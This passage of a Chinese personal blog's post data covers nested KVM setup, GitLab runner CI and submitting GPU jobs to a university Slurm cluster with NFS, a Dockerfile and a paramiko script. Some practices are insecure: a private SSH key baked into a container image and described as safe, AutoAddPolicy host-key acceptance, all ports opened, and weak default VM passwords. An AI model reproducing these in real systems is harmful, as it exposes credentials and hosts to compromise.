title=\"hostVM使用kvm模块\"></a>hostVM使用kvm模块</h2><p>没有内核模块kvm 手动复制进去加载会报格式错误</p>\n<p><code>/lib/modules</code>只有原来的版本 和新的内核版本对不上</p>\n<p>解决方案：</p>\n<p>config加入<code>CONFIG_KVM=y</code>及<code>CONFIG_KVM_INTEL=y</code></p>\n<h2 id=\"hostVM使用virtio-balloon模块\"><a href=\"#hostVM使用virtio-balloon模块\" class=\"headerlink\" title=\"hostVM使用virtio-balloon模块\"></a>hostVM使用virtio-balloon模块</h2><p><code>CONFIG_VIRTIO_BALLOON=m</code> 传入hostVM insmod加载 lsmod查看</p>\n<p>实际上可以用y直接编译进内核 即使lsmod看不见也是可用的</p>\n<p>qemu加入启动参数 这样qemu monitor有balloon相关命令 但是可能失效</p>\n<p>guest中balloon加载mod后会瞬间起效</p>\n<h2 id=\"guestVM内存超过hostVM\"><a href=\"#guestVM内存超过hostVM\" class=\"headerlink\" title=\"guestVM内存超过hostVM\"></a>guestVM内存超过hostVM</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ubuntu@jammy:~$ ./boot.sh</span><br><span class=\"line\">[   37.106705] __vm_enough_memory: pid: 472, comm: qemu-system-x86, not enough memory for the allocation</span><br><span class=\"line\">qemu-system-x86_64: cannot set up guest memory &#x27;pc.ram&#x27;: Cannot allocate memory</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://www.cnblogs.com/ruiy/p/11607036.html\">openstack kvm cannot set up guest memory ‘pc.ram’: Cannot allocate memory - 秦瑞It行程实录 - 博客园 (cnblogs.com)</a></p>\n<p><code> sudo bash -c &quot;echo 1 &gt; /proc/sys/vm/overcommit_memory&quot;</code></p>\n<h2 id=\"hostVM-用perf\"><a href=\"#hostVM-用perf\" class=\"headerlink\" title=\"hostVM 用perf\"></a>hostVM 用perf</h2><p>需要在host上编译hostVM image的source里面 编译perf</p>\n<p>如果编译报错 不是代码的问题 是依赖的问题 可能少了很多依赖没装 少哪个装哪个 最后少了pkg-config</p>\n<p>hostVM 用apt装 libbabeltrace-ctf-dev 等 也可以直接复制.so</p>\n<p>config加入<code>CONFIG_BPF_SYSCALL=y</code></p>\n<p>record后面必须加<code>-e cpu-clock</code> 否则会每次写入0.002M 无sample 和宿主机行为不一样</p>\n<p>火焰图下的FlameGraph脚本需要sudo</p>\n<h2 id=\"perf看不到kernel-symbol\"><a href=\"#perf看不到kernel-symbol\" class=\"headerlink\" title=\"perf看不到kernel symbol\"></a>perf看不到kernel symbol</h2><p>用-p pid可看到报错提示</p>\n<p>根据提示<code>sudo bash -c &quot;echo -1 &gt; /proc/sys/kernel/perf_event_paranoid&quot;</code></p>\n<p>值是2 disallow kernel profiling</p>\n<h2 id=\"guest-perf\"><a href=\"#guest-perf\" class=\"headerlink\" title=\"guest perf\"></a>guest perf</h2><p>tools目录 <code>make LDFLAGS=-static perf</code> ldd perf看到not a dynamic executable</p>\n<h2 id=\"VM增大磁盘容量\"><a href=\"#VM增大磁盘容量\" class=\"headerlink\" title=\"VM增大磁盘容量\"></a>VM增大磁盘容量</h2><p>先qemu-img resize</p>\n<p>然后进虚拟机 fdisk -l 看设备</p>\n<p>然后fdisk 设备  删分区 加分区  </p>\n<p><a href=\"https://taoshu.in/unix/resize-qemu-ext4.html#google_vignette\">https://taoshu.in/unix/resize-qemu-ext4.html#google_vignette</a></p>\n<h2 id=\"hostVM网络工具\"><a href=\"#hostVM网络工具\" class=\"headerlink\" title=\"hostVM网络工具\"></a>hostVM网络工具</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ubuntu@jammy:~$ make network</span><br><span class=\"line\">sudo brctl addbr br0</span><br><span class=\"line\">add bridge failed: Package not installed</span><br><span class=\"line\">make: *** [Makefile:2: network] Error 1</span><br></pre></td></tr></table></figure>\n\n<p>config加入<code>CONFIG_BRIDGE=y</code> <code>CONFIG_TUN=y</code> <code>CONFIG_TAP=y</code></p>\n<p>必须是y 不能是m</p>\n<p>guestVM启动分配的mac地址必须不可以和hostVM一样</p>\n<h2 id=\"ssh连接hostVM\"><a href=\"#ssh连接hostVM\" class=\"headerlink\" title=\"ssh连接hostVM\"></a>ssh连接hostVM</h2><p>默认优先级是从外至内的</p>\n<p>guestVM ctrl a x会退出两个 用ssh不会</p>\n<p><a href=\"https://blog.csdn.net/yjk13703623757/article/details/114936739\">解决Permission denied (publickey)._Locutus的博客-CSDN博客</a></p>\n<h2 id=\"soc-term\"><a href=\"#soc-term\" class=\"headerlink\" title=\"soc term\"></a>soc term</h2><p>如果不能配网络的情况下 用这个</p>\n<p><a href=\"https://review.trustedfirmware.org/plugins/gitiles/OP-TEE/build/+/c79ecf72671f50cf8768514245bce5e46cfe4fa5/soc_term.py\">soc_term.py - OP-TEE&#x2F;build - Gitiles (trustedfirmware.org)</a></p>\n<h2 id=\"挂载文件\"><a href=\"#挂载文件\" class=\"headerlink\" title=\"挂载文件\"></a>挂载文件</h2><p>用virtfs </p>\n<p><code>sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/shared</code></p>\n<h2 id=\"gdb-调内核\"><a href=\"#gdb-调内核\" class=\"headerlink\" title=\"gdb 调内核\"></a>gdb 调内核</h2><p>内核编译打开debug info</p>\n<p>内核目录下 <code>gdb vmlinux</code> 然后<code>target remote localhost:1234</code></p>\n<p>可以用hb代替b 可以启动完成后ctrl c 然后b 然后c</p>\n<p>启动加<code>-S -gdb tcp::1234</code></p>\n<p>需要加<code>-append &quot;nokaslr&quot;</code> 否则断点打了不会停</p>\n<h2 id=\"balloon\"><a href=\"#balloon\" class=\"headerlink\" title=\"balloon\"></a>balloon</h2><p><a href=\"http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html\">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>\n<h2 id=\"final\"><a href=\"#final\" class=\"headerlink\" title=\"final\"></a>final</h2><p>修改host上的<code>linux_stable</code> 使用defconfig并加入kvm的配置</p>\n<p>-kernel启动hostVM后把bzImage复制（scp）进hostVM，hostVM用同样的image启动guestVM</p>\n<p>hostVM ubuntu password 创建后先配置网络 然后host上用ssh连hostVM</p>\n<p>guestVM ubuntu 123</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">net:</span></span><br><span class=\"line\">        sudo brctl addbr br0</span><br><span class=\"line\">        sudo ip addr flush dev ens4</span><br><span class=\"line\">        sudo brctl addif br0 ens4</span><br><span class=\"line\">        sudo tunctl -t tap0 -u ubuntu</span><br><span class=\"line\">        sudo brctl addif br0 tap0</span><br><span class=\"line\">        sudo ifconfig ens4 up</span><br><span class=\"line\">        sudo ifconfig tap0 up</span><br><span class=\"line\">        sudo ifconfig br0 up</span><br><span class=\"line\">        sudo dhclient br0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">mem:</span></span><br><span class=\"line\">        sudo bash -c <span class=\"string\">&quot;echo 1 &gt; /proc/sys/vm/overcommit_memory&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">swap:</span></span><br><span class=\"line\">        sudo swapon test_swap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">watchmsg:</span></span><br><span class=\"line\">        watch <span class=\"string\">&quot;dmesg | tail -n 20&quot;</span></span><br><span class=\"line\"><span class=\"section\">watchfree:</span></span><br><span class=\"line\">        watch <span class=\"string\">&quot;free -mh&quot;</span></span><br><span class=\"line\"><span class=\"section\">init:</span></span><br><span class=\"line\">        make net</span><br><span class=\"line\">        make mem</span><br><span class=\"line\">        make swap</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["virtualization"]},{"title":"CI/CD","url":"/2024/01/22/misc/CICD/","content":"<h1 id=\"CI-CD\"><a href=\"#CI-CD\" class=\"headerlink\" title=\"CI&#x2F;CD\"></a>CI&#x2F;CD</h1><h3 id=\"test\"><a href=\"#test\" class=\"headerlink\" title=\"test\"></a>test</h3><p><a href=\"https://jiuaidu.com/jianzhan/1046052/\">go 覆盖测试工具介绍 - 建站教程 (jiuaidu.com)</a></p>\n<p><code>go test ./...</code>可以测试目录下所有的test文件</p>\n<p><code>go test minik8s/pkg/kubelet/container</code> 测试指定包下的测试文件</p>\n<h3 id=\"gitlab-runner\"><a href=\"#gitlab-runner\" class=\"headerlink\" title=\"gitlab runner\"></a>gitlab runner</h3><h4 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h4><p><code>docker run -d --name gitlab-runner --restart always   -v /srv/gitlab-runner/config:/etc/gitlab-runner   -v /var/run/docker.sock:/var/run/docker.sock   gitlab/gitlab-runner:v15.10.1</code></p>\n<p>执行器选择docker 这里镜像需要先在主机上写Dockerfile手动构建好，然后修改<code>config.toml</code>配置文件把<code>pull_policy</code>修改为<code>if-not-present</code></p>\n<p>对于简单测试没问题，但是对于CNI这种复杂的东西，即使加了privilege&#x3D;true，还是会出现和宿主机上不一样的情况。</p>\n<h4 id=\"host\"><a href=\"#host\" class=\"headerlink\" title=\"host\"></a>host</h4><p><a href=\"https://docs.gitlab.com/runner/install/\">Install GitLab Runner | GitLab</a></p>\n<p>交大云主机安装二进制</p>\n<p><code>nslookup www.ipads.sjtu.edu.cn</code> 安全组开放所有端口</p>\n<p><code>gitlab-runner register</code> 去gitlab网页的settings&#x2F;cicd复制url和token</p>\n<p>执行器选择shell 在主机上给gitlab-runner用户足够的权限</p>\n<p><a href=\"https://blog.csdn.net/qq_39940674/article/details/127616784\">【汇总】解决GitLab-Runner执行脚本命令无权限_gitlab-runner 提升权限_成为大佬先秃头的博客-CSDN博客</a></p>\n<p>采用这种方法进行CI&#x2F;CD，gitlab-runner会在主机上的某个目录跑脚本，用的都是主机的环境</p>\n<ul>\n<li>优点：不需要手动配一个拥有所有环境的镜像；没有容器导致的与主机不一致，跑不起来的情况。</li>\n<li>缺点：会对主机产生影响；在缺少依赖的情况下无法更换gitlab-runner所在主机。</li>\n</ul>\n<h3 id=\"gitlab-ci-yml\"><a href=\"#gitlab-ci-yml\" class=\"headerlink\" title=\".gitlab-ci.yml\"></a>.gitlab-ci.yml</h3><ol>\n<li><p>prepare: 设置go env，防止go test在download时超时</p>\n</li>\n<li><p>test：<code>go test</code> 如果测试涉及到的api需要权限，需要加sudo</p>\n<p>创建多个tag为shell的runner，使test阶段并行测试 （目前一共3个）</p>\n<p>需要修改手动<code>/etc/gitlab-runner/config.toml</code>的concurrent为3</p>\n</li>\n<li><p>build：<code>go build</code> 生成可执行文件在<code>/home/gitlab-runner/$CI_COMMIT_BRANCH/</code>目录下</p>\n<p>不同分支build出的文件不会互相覆盖</p>\n</li>\n</ol>\n<h3 id=\"代码同步\"><a href=\"#代码同步\" class=\"headerlink\" title=\"代码同步\"></a>代码同步</h3><p>同时推送到gitee和gitlab，不然无法用gitlab-runner</p>\n<p><a href=\"https://www.cnblogs.com/hmy-666/p/17304317.html\">git push origin master一次提交多个远程仓库 - 兜里还剩五块出头 - 博客园 (cnblogs.com)</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@minik8s-1:/mini-k8s# git remote -v</span><br><span class=\"line\">origin  https://gitee.com/szy_0127/mini-k8s.git (fetch)</span><br><span class=\"line\">origin  https://gitee.com/szy_0127/mini-k8s.git (push)</span><br><span class=\"line\">origin  https://ipads.se.sjtu.edu.cn:2020/520021910933/minik8s.git (push)</span><br></pre></td></tr></table></figure>\n\n","categories":["misc"]},{"title":"GPU","url":"/2024/01/22/misc/GPU/","content":"<h1 id=\"GPU\"><a href=\"#GPU\" class=\"headerlink\" title=\"GPU\"></a>GPU</h1><h2 id=\"交我算平台\"><a href=\"#交我算平台\" class=\"headerlink\" title=\"交我算平台\"></a>交我算平台</h2><p><a href=\"https://docs.hpc.sjtu.edu.cn/job/slurm.html\">Slurm 作业调度系统 — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><a href=\"https://docs.hpc.sjtu.edu.cn/job/dgx.html\">AI平台使用文档 — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><a href=\"https://docs.hpc.sjtu.edu.cn/job/jobsample2.html#cuda\">作业示例（开发者） — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><code>srun -p dgx2 -N 1 -n 1 --gres=gpu:1 --cpus-per-task=6 --pty /bin/bash</code>直接进计算节点</p>\n<p><code>sbatch xx.slurm</code>提交</p>\n<p><code>squeue</code>查看未执行</p>\n<p><code>sacct</code>查看任务</p>\n<h2 id=\"NFS\"><a href=\"#NFS\" class=\"headerlink\" title=\"NFS\"></a>NFS</h2><h3 id=\"master\"><a href=\"#master\" class=\"headerlink\" title=\"master\"></a>master</h3><p><code>apt-get install -y nfs-kernel-server</code></p>\n<p><code>/etc/exports</code>最后<code>/minik8s-sharedata *(rw,sync,no_subtree_check)</code></p>\n<p><code>/etc/init.d/nfs-kernel-server restart</code></p>\n<h3 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h3><p><code>apt-get install -y nfs-common</code></p>\n<p><code>mount master:/minik8s-sharedata /minik8s-sharedata</code></p>\n<p>master节点创建的文件&#x2F;文件夹在node节点readonly</p>\n<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><h3 id=\"主机与容器\"><a href=\"#主机与容器\" class=\"headerlink\" title=\"主机与容器\"></a>主机与容器</h3><p>通过查询相关资料，发现job的数据是只能通过与主机挂载目录完成的。master节点提交任务，最终跑在node节点，如何共享文件。</p>\n<ol>\n<li>把gpu的job yaml放在master节点，cu和Makefile放在node节点，且为该node节点加上gpu标签，yaml中的nodeselector加此标签。 这种方式把node暴露给用户，不合适。</li>\n<li>集群部署docker registry，master节点build一个镜像，然后node节点pull。这样可以获得上传的文件，但是无法把结果拿给master。</li>\n<li>NFS。master和node通过nfs，共享<code>/minik8s-sharedata</code>文件夹</li>\n</ol>\n<p>yaml文件挂载容器目录与主机共享文件夹，用环境变量指定参数和gpu文件</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">gpu-job</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">gpu</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gpu-server</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">gpu-server</span></span><br><span class=\"line\">      <span class=\"attr\">command:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"string\">&quot;./job.py&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">source-path</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">/gpu</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">job-name</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">gpu-matrix</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">partition</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">dgx2</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&quot;N&quot;</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">ntasks-per-node</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">cpus-per-task</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;6&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gres</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">gpu:1</span></span><br><span class=\"line\">      <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">share-data</span></span><br><span class=\"line\">          <span class=\"attr\">mountPath:</span> <span class=\"string\">/gpu</span></span><br><span class=\"line\">  <span class=\"attr\">volumes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">share-data</span></span><br><span class=\"line\">      <span class=\"attr\">hostPath:</span></span><br><span class=\"line\">        <span class=\"attr\">path:</span> <span class=\"string\">/minik8s-sharedata/gpu/matrix</span></span><br></pre></td></tr></table></figure>\n\n<p>注意这里N是个奇怪的关键字，必须加引号否则会解析错误</p>\n<p>容器把用户提供的source文件夹（包括代码文件和Makefile）整个上传到hpc服务器，以job-name命名，并本地生成slurm也上传到这个目录。要求用户代码将需要生成的文件放入source&#x2F;result中，并且一定要提前创建好，slurm会将程序的标准输入输出也放入source&#x2F;result中，最后可在主机的共享文件夹中拿到结果。</p>\n<p>用户可以灵活地自由添加任意源文件，只需要提供Makefile。规定的只有两点：</p>\n<ol>\n<li>用户代码需要把生成的文件存到同目录下result子目录中</li>\n<li>用户需要配置make build和make run两个命令</li>\n</ol>\n<h3 id=\"主机与hpc服务器\"><a href=\"#主机与hpc服务器\" class=\"headerlink\" title=\"主机与hpc服务器\"></a>主机与hpc服务器</h3><p>交大云主机<code>ssh-keygen -t rsa</code>为本机生成rsa公私钥</p>\n<p><code>ssh-copy-id stu1648@pilogin.hpc.sjtu.edu.cn</code>将交大云主机公钥添加到hpc登陆节点的authorized_keys中</p>\n<p>输入密码，添加成功</p>\n<p>之后ssh scp均无须密码，不需要把密码硬编码在代码中，安全</p>\n<h3 id=\"容器与hpc服务器\"><a href=\"#容器与hpc服务器\" class=\"headerlink\" title=\"容器与hpc服务器\"></a>容器与hpc服务器</h3><h4 id=\"build\"><a href=\"#build\" class=\"headerlink\" title=\"build\"></a>build</h4><p>所有node节点提前build镜像</p>\n<p>可以用<code>nerdctl tag gpu-server master:5000/gpu-server</code></p>\n<p><code>nerdctl push/pull master:5000/gpu-server --insecure-registry</code></p>\n<p>containerd的镜像与docker不共享 不可以用<code>docker build</code>（或者通过docker registry中转）</p>\n<p>如果用<code>nerdctl build</code> 需要存在<code>buildctl</code>(任意路径可调用)与<code>buildkitd</code>(提前跑的后台进程)<a href=\"https://github.com/moby/buildkit/\">Releases · moby&#x2F;buildkit (github.com)</a></p>\n<p>需要为容器创建.ssh目录放入主机的rsa私钥和known_hosts文件，便于不需要输yes和输密码</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get -y install openssh-server python3-pip vim</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> pip3 install paramiko scp</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /root</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">mkdir</span>  .ssh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./id_rsa .ssh/id_rsa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./known_hosts .ssh/known_hosts</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./job.py job.py</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>nerdctl build -t gpu-server .</code></p>\n<p><code>scp stu1648@data.hpc.sjtu.edu.cn:~/test_gpu.cu .</code></p>\n<p>仅使用shell命令只能做到文件传输，无法向远程主机发送需要执行的指令</p>\n<p>解决方法是使用expect或具有ssh功能的语言编写程序</p>\n<h4 id=\"expect\"><a href=\"#expect\" class=\"headerlink\" title=\"expect\"></a>expect</h4><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/usr/bin/expect -f</span></span><br><span class=\"line\">spawn bash -c &quot;ssh stu1648@pilogin.hpc.sjtu.edu.cn&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">set timeout 6</span><br><span class=\"line\">expect &quot;stu1648@pilogin*&quot;</span><br><span class=\"line\">send &quot;mkdir abc\\r&quot;</span><br><span class=\"line\">expect &quot;stu1648@pilogin*&quot;</span><br><span class=\"line\">send &quot;exit\\r&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">expect eof</span><br></pre></td></tr></table></figure>\n\n<p>expect正如名字所表达的，必须对服务端返回值在有限范围内进行预测，这是做不到从服务端拿到sbatch的返回值job_id的，故根据sacct或squeue查看job情况也无法完成，只能实现比较简单的提交任务操作。</p>\n<h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><p>使用python，可以不需要提前编译</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">from</span> scp <span class=\"keyword\">import</span> SCPClient</span><br><span class=\"line\"><span class=\"keyword\">from</span> os <span class=\"keyword\">import</span> getenv</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NREAD = <span class=\"number\">100000</span></span><br><span class=\"line\">ssh = paramiko.SSHClient()</span><br><span class=\"line\">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">ssh.connect(<span class=\"string\">&quot;pilogin.hpc.sjtu.edu.cn&quot;</span>,<span class=\"number\">22</span>,<span class=\"string\">&quot;stu1648&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">job_submit_tag = <span class=\"string\">&quot;Submitted batch job&quot;</span></span><br><span class=\"line\">line_finish_tag = <span class=\"string\">&quot;[stu1648@&quot;</span></span><br><span class=\"line\">PENDING = <span class=\"string\">&quot;PENDING&quot;</span></span><br><span class=\"line\">COMPLETED = <span class=\"string\">&quot;COMPLETED&quot;</span></span><br><span class=\"line\">FAILED = <span class=\"string\">&quot;FAILED&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">source_path = getenv(<span class=\"string\">&quot;source-path&quot;</span>)</span><br><span class=\"line\">job_name = getenv(<span class=\"string\">&quot;job-name&quot;</span>)</span><br><span class=\"line\">partition= getenv(<span class=\"string\">&quot;partition&quot;</span>)</span><br><span class=\"line\">N = getenv(<span class=\"string\">&quot;N&quot;</span>)</span><br><span class=\"line\">ntasks_per_node = getenv(<span class=\"string\">&quot;ntasks-per-node&quot;</span>)</span><br><span class=\"line\">cpus_per_task = getenv(<span class=\"string\">&quot;cpus-per-task&quot;</span>)</span><br><span class=\"line\">gres = getenv(<span class=\"string\">&quot;gres&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> job_name <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> source_path:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;env error&quot;</span>)</span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> source_path[-<span class=\"number\">1</span>] == <span class=\"string\">&quot;/&quot;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># scp send whole source</span></span><br><span class=\"line\">    source_path = source_path[:-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> partition:</span><br><span class=\"line\">    partition = <span class=\"string\">&quot;dgx2&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> N:</span><br><span class=\"line\">    N = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ntasks_per_node:</span><br><span class=\"line\">    ntasks_per_node = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> cpus_per_task:</span><br><span class=\"line\">    cpus_per_task = <span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> gres:</span><br><span class=\"line\">    gres = <span class=\"string\">&quot;gpu:1&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_slurm</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;generating slurm&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;./<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;#!/bin/bash\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --job-name=<span class=\"subst\">&#123;job_name&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --partition=<span class=\"subst\">&#123;partition&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH -N <span class=\"subst\">&#123;N&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --ntasks-per-node=<span class=\"subst\">&#123;ntasks_per_node&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --cpus-per-task=<span class=\"subst\">&#123;cpus_per_task&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --gres=<span class=\"subst\">&#123;gres&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># result must exist . is the same dir as .slurm</span></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --output=result/output.txt\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --error=result/error.txt\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;ulimit -s unlimited\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;ulimit -l unlimited\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;module load gcc/8.3.0 cuda/10.1.243-gcc-8.3.0\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;make build\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;make run\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload_source</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;uploading source&quot;</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    scp.put(source_path,recursive=<span class=\"literal\">True</span>,remote_path=<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>&quot;</span>)</span><br><span class=\"line\">    scp.put(<span class=\"string\">f&quot;./<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>,<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>/<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>)</span><br><span class=\"line\">    scp.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">download_result</span>(<span class=\"params\">job_id</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;downloading result&quot;</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"comment\">#scp.get(f&quot;~/result/&#123;job_id&#125;.out&quot;,f&quot;&#123;source_path&#125;/&#123;job_name&#125;.out&quot;)</span></span><br><span class=\"line\">    <span class=\"comment\">#scp.get(f&quot;~/result/&#123;job_id&#125;.err&quot;,f&quot;&#123;source_path&#125;/&#123;job_name&#125;.err&quot;)</span></span><br><span class=\"line\">    